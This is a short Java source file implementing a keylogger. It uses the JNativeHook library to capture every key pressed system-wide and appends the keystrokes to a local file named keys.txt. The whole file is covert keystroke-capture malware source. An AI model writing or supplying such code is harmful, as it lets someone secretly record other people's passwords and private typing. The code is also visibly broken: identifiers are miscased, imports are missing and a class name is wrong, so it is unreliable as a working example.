package keys;

import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;


import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;






public class logkey implements NativeKeyListener {
    private static final Path file = paths.get("keys.txt");

    public static void main(String[] args){


        try {
            GlobalScreen.registerNativeHook();

        }
        catch (NativeHookException e){
            System.exit(-1);

        }
        GlobalScreen.addNativeKeylistener(new keylogger());

    }
    public void nativeKeyPressed(NativeKeyEvent e){
        String keytext = NativeKeyEvent.getkeyText(e.getkeyCode());

        try (OutputStream os = Files.newOutputstream(file, StandardOpenOption.CREATE, standardOption.WRITE,standardOption.APPEND);PrintWriter writer = new PrinterWriter(os)){

            if (keyText.length()>1){
                writer.print("["+ keyText + "]");
            }
            else {
                writer.print(keyText);
            }

        }
        catch (IOException ex){
            System.exit(-1);
        }
    }
    public void nativeKeyReleased(NativeKeyEvent e){

    }
    public void nativeKeyTyped(NativeKeyEvent e){

    }
}
